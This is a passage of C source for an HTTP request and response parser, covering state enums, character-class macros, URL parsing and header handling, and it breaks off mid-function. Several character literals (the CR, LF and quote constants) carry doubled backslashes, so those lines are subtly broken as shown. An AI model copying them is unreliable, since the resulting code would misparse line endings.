  , s_req_query_string_start
  , s_req_query_string
  , s_req_fragment_start
  , s_req_fragment
  , s_req_http_start
  , s_req_http_H
  , s_req_http_HT
  , s_req_http_HTT
  , s_req_http_HTTP
  , s_req_http_major
  , s_req_http_dot
  , s_req_http_minor
  , s_req_http_end
  , s_req_line_almost_done

  , s_header_field_start
  , s_header_field
  , s_header_value_discard_ws
  , s_header_value_discard_ws_almost_done
  , s_header_value_discard_lws
  , s_header_value_start
  , s_header_value
  , s_header_value_lws

  , s_header_almost_done

  , s_chunk_size_start
  , s_chunk_size
  , s_chunk_parameters
  , s_chunk_size_almost_done

  , s_headers_almost_done
  , s_headers_done

  /* Important: 's_headers_done' must be the last 'header' state. All
   * states beyond this must be 'body' states. It is used for overflow
   * checking. See the PARSING_HEADER() macro.
   */

  , s_chunk_data
  , s_chunk_data_almost_done
  , s_chunk_data_done

  , s_body_identity
  , s_body_identity_eof

  , s_message_done
  };


#define PARSING_HEADER(state) (state <= s_headers_done)


enum header_states
  { h_general = 0
  , h_C
  , h_CO
  , h_CON

  , h_matching_connection
  , h_matching_proxy_connection
  , h_matching_content_length
  , h_matching_transfer_encoding
  , h_matching_upgrade

  , h_connection
  , h_content_length
  , h_content_length_num
  , h_content_length_ws
  , h_transfer_encoding
  , h_upgrade

  , h_matching_transfer_encoding_chunked
  , h_matching_connection_token_start
  , h_matching_connection_keep_alive
  , h_matching_connection_close
  , h_matching_connection_upgrade
  , h_matching_connection_token

  , h_transfer_encoding_chunked
  , h_connection_keep_alive
  , h_connection_close
  , h_connection_upgrade
  };

enum http_host_state
  {
    s_http_host_dead = 1
  , s_http_userinfo_start
  , s_http_userinfo
  , s_http_host_start
  , s_http_host_v6_start
  , s_http_host
  , s_http_host_v6
  , s_http_host_v6_end
  , s_http_host_v6_zone_start
  , s_http_host_v6_zone
  , s_http_host_port_start
  , s_http_host_port
};

/* Macros for character classes; depends on strict-mode  */
#define CR                  '\\r'
#define LF                  '\\n'
#define LOWER(c)            (unsigned char)(c | 0x20)
#define IS_ALPHA(c)         (LOWER(c) >= 'a' && LOWER(c) <= 'z')
#define IS_NUM(c)           ((c) >= '0' && (c) <= '9')
#define IS_ALPHANUM(c)      (IS_ALPHA(c) || IS_NUM(c))
#define IS_HEX(c)           (IS_NUM(c) || (LOWER(c) >= 'a' && LOWER(c) <= 'f'))
#define IS_MARK(c)          ((c) == '-' || (c) == '_' || (c) == '.' || \
  (c) == '!' || (c) == '~' || (c) == '*' || (c) == '\\'' || (c) == '(' || \
  (c) == ')')
#define IS_USERINFO_CHAR(c) (IS_ALPHANUM(c) || IS_MARK(c) || (c) == '%' || \
  (c) == ';' || (c) == ':' || (c) == '&' || (c) == '=' || (c) == '+' || \
  (c) == '$' || (c) == ',')

#define STRICT_TOKEN(c)     ((c == ' ') ? 0 : tokens[(unsigned char)c])

#if HTTP_PARSER_STRICT
#define TOKEN(c)            STRICT_TOKEN(c)
#define IS_URL_CHAR(c)      (BIT_AT(normal_url_char, (unsigned char)c))
#define IS_HOST_CHAR(c)     (IS_ALPHANUM(c) || (c) == '.' || (c) == '-')
#else
#define TOKEN(c)            tokens[(unsigned char)c]
#define IS_URL_CHAR(c)                                                         \
  (BIT_AT(normal_url_char, (unsigned char)c) || ((c) & 0x80))
#define IS_HOST_CHAR(c)                                                        \
  (IS_ALPHANUM(c) || (c) == '.' || (c) == '-' || (c) == '_')
#endif

/**
 * Verify that a char is a valid visible (printable) US-ASCII
 * character or %x80-FF
 **/
#define IS_HEADER_CHAR(ch)                                                     \
  (ch == CR || ch == LF || ch == 9 || ((unsigned char)ch > 31 && ch != 127))

#define start_state (parser->type == HTTP_REQUEST ? s_start_req : s_start_res)


#if HTTP_PARSER_STRICT
# define STRICT_CHECK(cond)                                          \
do {                                                                 \
  if (cond) {                                                        \
    SET_ERRNO(HPE_STRICT);                                           \
    goto error;                                                      \
  }                                                                  \
} while (0)
# define NEW_MESSAGE() (http_should_keep_alive(parser) ? start_state : s_dead)
#else
# define STRICT_CHECK(cond)
# define NEW_MESSAGE() start_state
#endif


/* Map errno values to strings for human-readable output */
#define HTTP_STRERROR_GEN(n, s) { "HPE_" #n, s },
static struct {
  const char *name;
  const char *description;
} http_strerror_tab[] = {
  HTTP_ERRNO_MAP(HTTP_STRERROR_GEN)
};
#undef HTTP_STRERROR_GEN

int http_message_needs_eof(const http_parser *parser);

/* Our URL parser.
 *
 * This is designed to be shared by http_parser_execute() for URL validation,
 * hence it has a state transition + byte-for-byte interface. In addition, it
 * is meant to be embedded in http_parser_parse_url(), which does the dirty
 * work of turning state transitions URL components for its API.
 *
 * This function should only be invoked with non-space characters. It is
 * assumed that the caller cares about (and can detect) the transition between
 * URL and non-URL states by looking for these.
 */
static enum state
parse_url_char(enum state s, const char ch)
{
  if (ch == ' ' || ch == '\\r' || ch == '\\n') {
    return s_dead;
  }

#if HTTP_PARSER_STRICT
  if (ch == '\t' || ch == '\f') {
    return s_dead;
  }
#endif

  switch (s) {
    case s_req_spaces_before_url:
      /* Proxied requests are followed by scheme of an absolute URI (alpha).
       * All methods except CONNECT are followed by '/' or '*'.
       */

      if (ch == '/' || ch == '*') {
        return s_req_path;
      }

      if (IS_ALPHA(ch)) {
        return s_req_schema;
      }

      break;

    case s_req_schema:
      if (IS_ALPHA(ch)) {
        return s;
      }

      if (ch == ':') {
        return s_req_schema_slash;
      }

      break;

    case s_req_schema_slash:
      if (ch == '/') {
        return s_req_schema_slash_slash;
      }

      break;

    case s_req_schema_slash_slash:
      if (ch == '/') {
        return s_req_server_start;
      }

      break;

    case s_req_server_with_at:
      if (ch == '@') {
        return s_dead;
      }

    /* fall through */
    case s_req_server_start:
    case s_req_server:
      if (ch == '/') {
        return s_req_path;
      }

      if (ch == '?') {
        return s_req_query_string_start;
      }

      if (ch == '@') {
        return s_req_server_with_at;
      }

      if (IS_USERINFO_CHAR(ch) || ch == '[' || ch == ']') {
        return s_req_server;
      }

      break;

    case s_req_path:
      if (IS_URL_CHAR(ch)) {
        return s;
      }

      switch (ch) {
        case '?':
          return s_req_query_string_start;

        case '#':
          return s_req_fragment_start;
      }

      break;

    case s_req_query_string_start:
    case s_req_query_string:
      if (IS_URL_CHAR(ch)) {
        return s_req_query_string;
      }

      switch (ch) {
        case '?':
          /* allow extra '?' in query string */
          return s_req_query_string;

        case '#':
          return s_req_fragment_start;
      }

      break;

    case s_req_fragment_start:
      if (IS_URL_CHAR(ch)) {
        return s_req_fragment;
      }

      switch (ch) {
        case '?':
          return s_req_fragment;

        case '#':
          return s;
      }

      break;

    case s_req_fragment:
      if (IS_URL_CHAR(ch)) {
        return s;
      }

      switch (ch) {
        case '?':
        case '#':
          return s;
      }

      break;

    default:
      break;
  }

  /* We should never fall out of the switch above unless there's an error */
  return s_dead;
}

size_t http_parser_execute (http_parser *parser,
                            const http_parser_settings *settings,
                            const char *data,
                            size_t len)
{
  char c, ch;
  int8_t unhex_val;
  const char *p = data;
  const char *header_field_mark = 0;
  const char *header_value_mark = 0;
  const char *url_mark = 0;
  const char *body_mark = 0;
  const char *status_mark = 0;
  enum state p_state = (enum state) parser->state;
  const unsigned int lenient = parser->lenient_http_headers;
  uint32_t nread = parser->nread;

  /* We're in an error state. Don't bother doing anything. */
  if (HTTP_PARSER_ERRNO(parser) != HPE_OK) {
    return 0;
  }

  if (len == 0) {
    switch (CURRENT_STATE()) {
      case s_body_identity_eof:
        /* Use of CALLBACK_NOTIFY() here would erroneously return 1 byte read if
         * we got paused.
         */
        CALLBACK_NOTIFY_NOADVANCE(message_complete);
        return 0;

      case s_dead:
      case s_start_req_or_res:
      case s_start_res:
      case s_start_req:
        return 0;

      default:
        SET_ERRNO(HPE_INVALID_EOF_STATE);
        return 1;
    }
  }


  if (CURRENT_STATE() == s_header_field)
    header_field_mark = data;
  if (CURRENT_STATE() == s_header_value)
    header_value_mark = data;
  switch (CURRENT_STATE()) {
  case s_req_path:
  case s_req_schema:
  case s_req_schema_slash:
  case s_req_schema_slash_slash:
  case s_req_server_start:
  case s_req_server:
  case s_req_server_with_at:
  case s_req_query_string_start:
  case s_req_query_string:
  case s_req_fragment_start:
  case s_req_fragment:
    url_mark = data;
    break;
  case s_res_status:
    status_mark = data;
    break;
  default:
    break;
  }

  for (p=data; p != data + len; p++) {
    ch = *p;

    if (PARSING_HEADER(CURRENT_STATE()))
      COUNT_HEADER_SIZE(1);

reexecute:
    switch (CURRENT_STATE()) {

      case s_dead:
        /* this state is used after a 'Connection: close' message
         * the parser will error out if it reads another message
         */
        if (LIKELY(ch == CR || ch == LF))
          break;

        SET_ERRNO(HPE_CLOSED_CONNECTION);
        goto error;

      case s_start_req_or_res:
      {
        if (ch == CR || ch == LF)
          break;
        parser->flags = 0;
        parser->content_length = ULLONG_MAX;

        if (ch == 'H') {
          UPDATE_STATE(s_res_or_resp_H);

          CALLBACK_NOTIFY(message_begin);
        } else {
          parser->type = HTTP_REQUEST;
          UPDATE_STATE(s_start_req);
          REEXECUTE();
        }

        break;
      }

      case s_res_or_resp_H:
        if (ch == 'T') {
          parser->type = HTTP_RESPONSE;
          UPDATE_STATE(s_res_HT);
        } else {
          if (UNLIKELY(ch != 'E')) {
            SET_ERRNO(HPE_INVALID_CONSTANT);
            goto error;
          }

          parser->type = HTTP_REQUEST;
          parser->method = HTTP_HEAD;
          parser->index = 2;
          UPDATE_STATE(s_req_method);
        }
        break;

      case s_start_res:
      {
        if (ch == CR || ch == LF)
          break;
        parser->flags = 0;
        parser->content_length = ULLONG_MAX;

        if (ch == 'H') {
          UPDATE_STATE(s_res_H);
        } else {
          SET_ERRNO(HPE_INVALID_CONSTANT);
          goto error;
        }

        CALLBACK_NOTIFY(message_begin);
        break;
      }

      case s_res_H:
        STRICT_CHECK(ch != 'T');
        UPDATE_STATE(s_res_HT);
        break;

      case s_res_HT:
        STRICT_CHECK(ch != 'T');
        UPDATE_STATE(s_res_HTT);
        break;

      case s_res_HTT:
        STRICT_CHECK(ch != 'P');
        UPDATE_STATE(s_res_HTTP);
        break;

      case s_res_HTTP:
        STRICT_CHECK(ch != '/');
        UPDATE_STATE(s_res_http_major);
        break;

      case s_res_http_major:
        if (UNLIKELY(!IS_NUM(ch))) {
          SET_ERRNO(HPE_INVALID_VERSION);
          goto error;
        }

        parser->http_major = ch - '0';
        UPDATE_STATE(s_res_http_dot);
        break;

      case s_res_http_dot:
      {
        if (UNLIKELY(ch != '.')) {
          SET_ERRNO(HPE_INVALID_VERSION);
          goto error;
        }

        UPDATE_STATE(s_res_http_minor);
        break;
      }

      case s_res_http_minor:
        if (UNLIKELY(!IS_NUM(ch))) {
          SET_ERRNO(HPE_INVALID_VERSION);
          goto error;
        }

        parser->http_minor = ch - '0';
        UPDATE_STATE(s_res_http_end);
        break;

      case s_res_http_end:
      {
        if (UNLIKELY(ch != ' ')) {
          SET_ERRNO(HPE_INVALID_VERSION);
          goto error;
        }

        UPDATE_STATE(s_res_first_status_code);
        break;
      }

      case s_res_first_status_code:
      {
        if (!IS_NUM(ch)) {
          if (ch == ' ') {
            break;
          }

          SET_ERRNO(HPE_INVALID_STATUS);
          goto error;
        }
        parser->status_code = ch - '0';
        UPDATE_STATE(s_res_status_code);
        break;
      }

      case s_res_status_code:
      {
        if (!IS_NUM(ch)) {
          switch (ch) {
            case ' ':
              UPDATE_STATE(s_res_status_start);
              break;
            case CR:
            case LF:
              UPDATE_STATE(s_res_status_start);
              REEXECUTE();
              break;
            default:
              SET_ERRNO(HPE_INVALID_STATUS);
              goto error;
          }
          break;
        }

        parser->status_code *= 10;
        parser->status_code += ch - '0';

        if (UNLIKELY(parser->status_code > 999)) {
          SET_ERRNO(HPE_INVALID_STATUS);
          goto error;
        }

        break;
      }

      case s_res_status_start:
      {
        MARK(status);
        UPDATE_STATE(s_res_status);
        parser->index = 0;

        if (ch == CR || ch == LF)
          REEXECUTE();

        break;
      }

      case s_res_status:
        if (ch == CR) {
          UPDATE_STATE(s_res_line_almost_done);
          CALLBACK_DATA(status);
          break;
        }

        if (ch == LF) {
          UPDATE_STATE(s_header_field_start);
          CALLBACK_DATA(status);
          break;
        }

        break;

      case s_res_line_almost_done:
        STRICT_CHECK(ch != LF);
        UPDATE_STATE(s_header_field_start);
        break;

      case s_start_req:
      {
        if (ch == CR || ch == LF)
          break;
        parser->flags = 0;
        parser->content_length = ULLONG_MAX;

        if (UNLIKELY(!IS_ALPHA(ch))) {
          SET_ERRNO(HPE_INVALID_METHOD);
          goto error;
        }

        parser->method = (enum http_method) 0;
        parser->index = 1;
        switch (ch) {
          case 'A': parser->method = HTTP_ACL; break;
          case 'B': parser->method = HTTP_BIND; break;
          case 'C': parser->method = HTTP_CONNECT; /* or COPY, CHECKOUT */ break;
          case 'D': parser->method = HTTP_DELETE; break;
          case 'G': parser->method = HTTP_GET; break;
          case 'H': parser->method = HTTP_HEAD; break;
          case 'L': parser->method = HTTP_LOCK; /* or LINK */ break;
          case 'M': parser->method = HTTP_MKCOL; /* or MOVE, MKACTIVITY, MERGE, M-SEARCH, MKCALENDAR */ break;
          case 'N': parser->method = HTTP_NOTIFY; break;
          case 'O': parser->method = HTTP_OPTIONS; break;
          case 'P': parser->method = HTTP_POST;
            /* or PROPFIND|PROPPATCH|PUT|PATCH|PURGE */
            break;
          case 'R': parser->method = HTTP_REPORT; /* or REBIND */ break;
          case 'S': parser->method = HTTP_SUBSCRIBE; /* or SEARCH, SOURCE */ break;
          case 'T': parser->method = HTTP_TRACE; break;
          case 'U': parser->method = HTTP_UNLOCK; /* or UNSUBSCRIBE, UNBIND, UNLINK */ break;
          default:
            SET_ERRNO(HPE_INVALID_METHOD);
            goto error;
        }
        UPDATE_STATE(s_req_method);

        CALLBACK_NOTIFY(message_begin);

        break;
      }

      case s_req_method:
      {
        const char *matcher;
        if (UNLIKELY(ch == '\0')) {
          SET_ERRNO(HPE_INVALID_METHOD);
          goto error;
        }

        matcher = method_strings[parser->method];
        if (ch == ' ' && matcher[parser->index] == '\0') {
          UPDATE_STATE(s_req_spaces_before_url);
        } else if (ch == matcher[parser->index]) {
          ; /* nada */
        } else if ((ch >= 'A' && ch <= 'Z') || ch == '-') {

          switch (parser->method << 16 | parser->index << 8 | ch) {
#define XX(meth, pos, ch, new_meth) \
            case (HTTP_##meth << 16 | pos << 8 | ch): \
              parser->method = HTTP_##new_meth; break;

            XX(POST,      1, 'U', PUT)
            XX(POST,      1, 'A', PATCH)
            XX(POST,      1, 'R', PROPFIND)
            XX(PUT,       2, 'R', PURGE)
            XX(CONNECT,   1, 'H', CHECKOUT)
            XX(CONNECT,   2, 'P', COPY)
            XX(MKCOL,     1, 'O', MOVE)
            XX(MKCOL,     1, 'E', MERGE)
            XX(MKCOL,     1, '-', MSEARCH)
            XX(MKCOL,     2, 'A', MKACTIVITY)
            XX(MKCOL,     3, 'A', MKCALENDAR)
            XX(SUBSCRIBE, 1, 'E', SEARCH)
            XX(SUBSCRIBE, 1, 'O', SOURCE)
            XX(REPORT,    2, 'B', REBIND)
            XX(PROPFIND,  4, 'P', PROPPATCH)
            XX(LOCK,      1, 'I', LINK)
            XX(UNLOCK,    2, 'S', UNSUBSCRIBE)
            XX(UNLOCK,    2, 'B', UNBIND)
            XX(UNLOCK,    3, 'I', UNLINK)
#undef XX
            default:
              SET_ERRNO(HPE_INVALID_METHOD);
              goto error;
          }
        } else {
          SET_ERRNO(HPE_INVALID_METHOD);
          goto error;
        }

        ++parser->index;
        break;
      }

      case s_req_spaces_before_url:
      {
        if (ch == ' ') break;

        MARK(url);
        if (parser->method == HTTP_CONNECT) {
          UPDATE_STATE(s_req_server_start);
        }

        UPDATE_STATE(parse_url_char(CURRENT_STATE(), ch));
        if (UNLIKELY(CURRENT_STATE() == s_dead)) {
          SET_ERRNO(HPE_INVALID_URL);
          goto error;
        }

        break;
      }

      case s_req_schema:
      case s_req_schema_slash:
      case s_req_schema_slash_slash:
      case s_req_server_start:
      {
        switch (ch) {
          /* No whitespace allowed here */
          case ' ':
          case CR:
          case LF:
            SET_ERRNO(HPE_INVALID_URL);
            goto error;
          default:
            UPDATE_STATE(parse_url_char(CURRENT_STATE(), ch));
            if (UNLIKELY(CURRENT_STATE() == s_dead)) {
              SET_ERRNO(HPE_INVALID_URL);
              goto error;
            }
        }

        break;
      }

      case s_req_server:
      case s_req_server_with_at:
      case s_req_path:
      case s_req_query_string_start:
      case s_req_query_string:
      case s_req_fragment_start:
      case s_req_fragment:
      {
        switch (ch) {
          case ' ':
            UPDATE_STATE(s_req_http_start);
            CALLBACK_DATA(url);
            break;
          case CR:
          case LF:
            parser->http_major = 0;
            parser->http_minor = 9;
            UPDATE_STATE((ch == CR) ?
              s_req_line_almost_done :
              s_header_field_start);
            CALLBACK_DATA(url);
            break;
          default:
            UPDATE_STATE(parse_url_char(CURRENT_STATE(), ch));
            if (UNLIKELY(CURRENT_STATE() == s_dead)) {
              SET_ERRNO(HPE_INVALID_URL);
              goto error;
            }
        }
        break;
      }

      case s_req_http_start:
        switch (ch) {
          case 'H':
            UPDATE_STATE(s_req_http_H);
            break;
          case ' ':
            break;
          default:
            SET_ERRNO(HPE_INVALID_CONSTANT);
            goto error;
        }
        break;

      case s_req_http_H:
        STRICT_CHECK(ch != 'T');
        UPDATE_STATE(s_req_http_HT);
        break;

      case s_req_http_HT:
        STRICT_CHECK(ch != 'T');
        UPDATE_STATE(s_req_http_HTT);
        break;

      case s_req_http_HTT:
        STRICT_CHECK(ch != 'P');
        UPDATE_STATE(s_req_http_HTTP);
        break;

      case s_req_http_HTTP:
        STRICT_CHECK(ch != '/');
        UPDATE_STATE(s_req_http_major);
        break;

      case s_req_http_major:
        if (UNLIKELY(!IS_NUM(ch))) {
          SET_ERRNO(HPE_INVALID_VERSION);
          goto error;
        }

        parser->http_major = ch - '0';
        UPDATE_STATE(s_req_http_dot);
        break;

      case s_req_http_dot:
      {
        if (UNLIKELY(ch != '.')) {
          SET_ERRNO(HPE_INVALID_VERSION);
          goto error;
        }

        UPDATE_STATE(s_req_http_minor);
        break;
      }

      case s_req_http_minor:
        if (UNLIKELY(!IS_NUM(ch))) {
          SET_ERRNO(HPE_INVALID_VERSION);
          goto error;
        }

        parser->http_minor = ch - '0';
        UPDATE_STATE(s_req_http_end);
        break;

      case s_req_http_end:
      {
        if (ch == CR) {
          UPDATE_STATE(s_req_line_almost_done);
          break;
        }

        if (ch == LF) {
          UPDATE_STATE(s_header_field_start);
          break;
        }

        SET_ERRNO(HPE_INVALID_VERSION);
        goto error;
        break;
      }

      /* end of request line */
      case s_req_line_almost_done:
      {
        if (UNLIKELY(ch != LF)) {
          SET_ERRNO(HPE_LF_EXPECTED);
          goto error;
        }

        UPDATE_STATE(s_header_field_start);
        break;
      }

      case s_header_field_start:
      {
        if (ch == CR) {
          UPDATE_STATE(s_headers_almost_done);
          break;
        }

        if (ch == LF) {
          /* they might be just sending \\n instead of \\r\\n so this would be
           * the second \\n to denote the end of headers*/
          UPDATE_STATE(s_headers_almost_done);
          REEXECUTE();
        }

        c = TOKEN(ch);

        if (UNLIKELY(!c)) {
          SET_ERRNO(HPE_INVALID_HEADER_TOKEN);
          goto error;
        }

        MARK(header_field);

        parser->index = 0;
        UPDATE_STATE(s_header_field);

        switch (c) {
          case 'c':
            parser->header_state = h_C;
            break;

          case 'p':
            parser->header_state = h_matching_proxy_connection;
            break;

          case 't':
            parser->header_state = h_matching_transfer_encoding;
            break;

          case 'u':
            parser->header_state = h_matching_upgrade;
            break;

          default:
            parser->header_state = h_general;
            break;
        }
        break;
      }

      case s_header_field:
      {
        const char* start = p;
        for (; p != data + len; p++) {
          ch = *p;
          c = TOKEN(ch);

          if (!c)
            break;

          switch (parser->header_state) {
            case h_general: {
              size_t limit = data + len - p;
              limit = MIN(limit, HTTP_MAX_HEADER_SIZE);
              while (p+1 < data + limit && TOKEN(p[1])) {
                p++;
              }
              break;
            }

            case h_C:
              parser->index++;
              parser->header_state = (c == 'o' ? h_CO : h_general);
              break;

            case h_CO:
              parser->index++;
              parser->header_state = (c == 'n' ? h_CON : h_general);
              break;

            case h_CON:
              parser->index++;
              switch (c) {
                case 'n':
                  parser->header_state = h_matching_connection;
                  break;
                case 't':
                  parser->header_state = h_matching_content_length;
                  break;
                default:
                  parser->header_state = h_general;
                  break;
              }
              break;

            /* connection */

            case h_matching_connection:
              parser->index++;
              if (parser->index > sizeof(CONNECTION)-1
                  || c != CONNECTION[parser->index]) {
                parser->header_state = h_general;
              } else if (parser->index == sizeof(CONNECTION)-2) {
                parser->header_state = h_connection;
              }
              break;

            /* proxy-connection */

            case h_matching_proxy_connection:
              parser->index++;
              if (parser->index > sizeof(PROXY_CONNECTION)-1
                  || c != PROXY_CONNECTION[parser->index]) {
                parser->header_state = h_general;
              } else if (parser->index == sizeof(PROXY_CONNECTION)-2) {
                parser->header_state = h_connection;
              }
              break;

            /* content-length */

            case h_matching_content_length:
              parser->index++;
              if (parser->index > sizeof(CONTENT_LENGTH)-1
                  || c != CONTENT_LENGTH[parser->index]) {
                parser->header_state = h_general;
              } else if (parser->index == sizeof(CONTENT_LENGTH)-2) {
                parser->header_state = h_content_length;
              }
              break;

            /* transfer-encoding */

            case h_matching_transfer_encoding:
              parser->index++;
              if (parser->index > sizeof(TRANSFER_ENCODING)-1
                  || c != TRANSFER_ENCODING[parser->index]) {
                parser->header_state = h_general;
              } else if (parser->index == sizeof(TRANSFER_ENCODING)-2) {
                parser->header_state = h_transfer_encoding;
              }
              break;

            /* upgrade */

            case h_matching_upgrade:
              parser->index++;
              if (parser->index > sizeof(UPGRADE)-1
                  || c != UPGRADE[parser->index]) {
                parser->header_state = h_general;
              } else if (parser->index == sizeof(UPGRADE)-2) {
                parser->header_state = h_upgrade;
              }
              break;

            case h_connection:
            case h_content_length:
            case h_transfer_encoding:
            case h_upgrade:
              if (ch != ' ') parser->header_state = h_general;
              break;

            default:
              assert(0 && "Unknown header_state");
              break;
          }
        }

        if (p == data + len) {
          --p;
          COUNT_HEADER_SIZE(p - start);
          break;
        }

        COUNT_HEADER_SIZE(p - start);

        if (ch == ':') {
          UPDATE_STATE(s_header_value_discard_ws);
          CALLBACK_DATA(header_field);
          break;
        }

        SET_ERRNO(HPE_INVALID_HEADER_TOKEN);
        goto error;
      }

      case s_header_value_discard_ws:
        if (ch == ' ' || ch == '\t') break;

        if (ch == CR) {
          UPDATE_STATE(s_header_value_discard_ws_almost_done);
          break;
        }

        if (ch == LF) {
          UPDATE_STATE(s_header_value_discard_lws);
          break;
        }

        /* fall through */

      case s_header_value_start:
      {
        MARK(header_value);

        UPDATE_STATE(s_header_value);
        parser->index = 0;

        c = LOWER(ch);

        switch (parser->header_state) {
          case h_upgrade:
            parser->flags |= F_UPGRADE;
            parser->header_state = h_general;
            break;

          case h_transfer_encoding:
            /* looking for 'Transfer-Encoding: chunked' */
            if ('c' == c) {
              parser->header_state = h_matching_transfer_encoding_chunked;
            } else {
              parser->header_state = h_general;
            }
            break;

          case h_content_length:
            if (UNLIKELY(!IS_NUM(ch))) {
              SET_ERRNO(HPE_INVALID_CONTENT_LENGTH);
              goto error;
            }

            if (parser->flags & F_CONTENTLENGTH) {
              SET_ERRNO(HPE_UNEXPECTED_CONTENT_LENGTH);
              goto error;
            }

            parser->flags |= F_CONTENTLENGTH;
            parser->content_length = ch - '0';
            parser->header_state = h_content_length_num;
            break;

          case h_connection:
            /* looking for 'Connection: keep-alive' */
            if (c == 'k') {
              parser->header_state = h_matching_connection_keep_alive;
            /* looking for 'Connection: close' */
            } else if (c == 'c') {
              parser->header_state = h_matching_connection_close;
            } else if (c == 'u') {
              parser->header_state = h_matching_connection_upgrade;
            } else {
              parser->header_state = h_matching_connection_token;
            }
            break;

          /* Multi-value `Connection` header */
          case h_matching_connection_token_start:
            break;

          default:
            parser->header_state = h_general;
            break;
        }
        break;
      }

      case s_header_value:
      {
        const char* start = p;
        enum header_states h_state = (enum header_states) parser->header_state;
        for (; p != data + len; p++) {
          ch = *p;
          if (ch == CR) {
            UPDATE_STATE(s_header_almost_done);
            parser->header_state = h_state;
            CALLBACK_DATA(header_value);
            break;
          }

          if (ch == LF) {
            UPDATE_STATE(s_header_almost_done);
            COUNT_HEADER_SIZE(p - start);
            parser->header_state = h_state;
            CALLBACK_DATA_NOADVANCE(header_value);
            REEXECUTE();
          }

          if (!lenient && !IS_HEADER_CHAR(ch)) {
            SET_ERRNO(HPE_INVALID_HEADER_TOKEN);
            goto error;
          }

          c = LOWER(ch);

          switch (h_state) {
            case h_general:
            {
              const char* p_cr;
              const char* p_lf;
              size_t limit = data + len - p;

              limit = MIN(limit, HTTP_MAX_HEADER_SIZE);

              p_cr = (const char*) memchr(p, CR, limit);
              p_lf = (const char*) memchr(p, LF, limit);
              if (p_cr != NULL) {
                if (p_lf != NULL && p_cr >= p_lf)
                  p = p_lf;
                else
                  p = p_cr;
              } else if (UNLIKELY(p_lf != NULL)) {
                p = p_lf;
              } else {
                p = data + len;
              }
              --p;
              break;
            }

            case h_connection:
            case h_transfer_encoding:
              assert(0 && "Shouldn't get here.");
              break;

            case h_content_length:
              if (ch == ' ') break;
              h_state = h_content_length_num;
              /* fall through */

            case h_content_length_num:
            {
              uint64_t t;

              if (ch == ' ') {
                h_state = h_content_length_ws;
                break;
              }

              if (UNLIKELY(!IS_NUM(ch))) {
                SET_ERRNO(HPE_INVALID_CONTENT_LENGTH);
                parser->header_state = h_state;
                goto error;
              }

              t = parser->content_length;
              t *= 10;
              t += ch - '0';

              /* Overflow? Test against a conservative limit for simplicity. */
              if (UNLIKELY((ULLONG_MAX - 10) / 10 < parser->content_length)) {
                SET_ERRNO(HPE_INVALID_CONTENT_LENGTH);
                parser->header_state = h_state;
                goto error;
              }

              parser->content_length = t;
              break;
            }

            case h_content_length_ws:
              if (ch == ' ') break;
              SET_ERRNO(HPE_INVALID_CONTENT_LENGTH);
              parser->header_state = h_state;
              goto error;

            /* Transfer-Encoding: chunked */
            case h_matching_transfer_encoding_chunked:
              parser->index++;
              if (parser->index > sizeof(CHUNKED)-1
                  || c != CHUNKED[parser->index]) {
                h_state = h_general;
              } else if (parser->index == sizeof(CHUNKED)-2) {
                h_state = h_transfer_encoding_chunked;
              }
              break;

            case h_matching_connection_token_start:
              /* looking for 'Connection: keep-alive' */
              if (c == 'k') {
                h_state = h_matching_connection_keep_alive;
              /* looking for 'Connection: close' */
              } else if (c == 'c') {
                h_state = h_matching_connection_close;
              } else if (c == 'u') {
                h_state = h_matching_connection_upgrade;
              } else if (STRICT_TOKEN(c)) {
                h_state = h_matching_connection_token;
              } else if (c == ' ' || c == '\t') {
                /* Skip lws */
              } else {
                h_state = h_general;
              }
              break;

            /* looking for 'Connection: keep-alive' */
            case h_matching_connection_keep_alive:
              parser->index++;
              if (parser->index > sizeof(KEEP_ALIVE)-1
                  || c != KEEP_ALIVE[parser->index]) {
                h_state = h_matching_connection_token;
              } else if (parser->index == sizeof(KEEP_ALIVE)-2) {
                h_state = h_connection_keep_alive;
              }
              break;

            /* looking for 'Connection: close' */
            case h_matching_connection_close:
              parser->index++;
              if (parser->index > sizeof(CLOSE)-1 || c != CLOSE[parser->index]) {
                h_state = h_matching_connection_token;
              } else if (parser->index == sizeof(CLOSE)-2) {
                h_state = h_connection_close;
              }
              break;

            /* looking for 'Connection: upgrade' */
            case h_matching_connection_upgrade:
              parser->index++;
              if (parser->index > sizeof(UPGRADE) - 1 ||
                  c != UPGRADE[parser->index]) {
                h_state = h_matching_connection_token;
              } else if (parser->index == sizeof(UPGRADE)-2) {
                h_state = h_connection_upgrade;
              }
              break;

            case h_matching_connection_token:
              if (ch == ',') {
                h_state = h_matching_connection_token_start;
                parser->index = 0;
              }
              break;

            case h_transfer_encoding_chunked:
              if (ch != ' ') h_state = h_general;
              break;

            case h_connection_keep_alive:
            case h_connection_close:
            case h_connection_upgrade:
              if (ch == ',') {
                if (h_state == h_connection_keep_alive) {
                  parser->flags |= F_CONNECTION_KEEP_ALIVE;
                } else if (h_state == h_connection_close) {
                  parser->flags |= F_CONNECTION_CLOSE;
                } else if (h_state == h_connection_upgrade) {
                  parser->flags |= F_CONNECTION_UPGRADE;
                }
                h_state = h_matching_connection_token_start;
                parser->index = 0;
              } else if (ch != ' ') {
                h_state = h_matching_connection_token;
              }
              break;

            default:
              UPDATE_STATE(s_header_value);
              h_state = h_general;
              break;
          }
        }
        parser->header_state = h_state;

        if (p == data + len)
          --p;

        COUNT_HEADER_SIZE(p - start);
        break;
      }

      case s_header_almost_done:
      {
        if (UNLIKELY(ch != LF)) {
          SET_ERRNO(HPE_LF_EXPECTED);
          goto error;
        }

        UPDATE_STATE(s_header_value_lws);
        break;
      }

      case s_header_value_lws:
      {
        if (ch == ' ' || ch == '\t') {
          UPDATE_STATE(s_header_value_start);
          REEXECUTE();
        }

        /* finished the header */
        switch (parser->header_state) {
          case h_connection_keep_alive:
            parser->flags |= F_CONNECTION_KEEP_ALIVE;
            break;
          case h_connection_close:
            parser->flags |= F_CONNECTION_CLOSE;
            break;
          case h_transfer_encoding_chunked:
            parser->flags |= F_CHUNKED;
            break;
          case h_connection_upgrade:
            parser->flags |= F_CONNECTION_UPGRADE;
            break;
          default:
            break;
        }

        UPDATE_STATE(s_header_field_start);
        REEXECUTE();
      }

      case s_header_value_discard_ws_almost_done:
      {
        STRICT_CHECK(ch != LF);
        UPDATE_STATE(s_header_value_discard_lws);
        break;
      }

      case s_header_value_discard_lws:
      {
        if (ch == ' ' || ch == '\t') {
          UPDATE_STATE(s_header_value_discard_ws);
          break;
        } else {
          switch (parser->header_state) {
            case h_connection_keep_alive:
              parser->flags |= F_CONNECTION_KEEP_ALIVE;
              break;
            case h_connection_close:
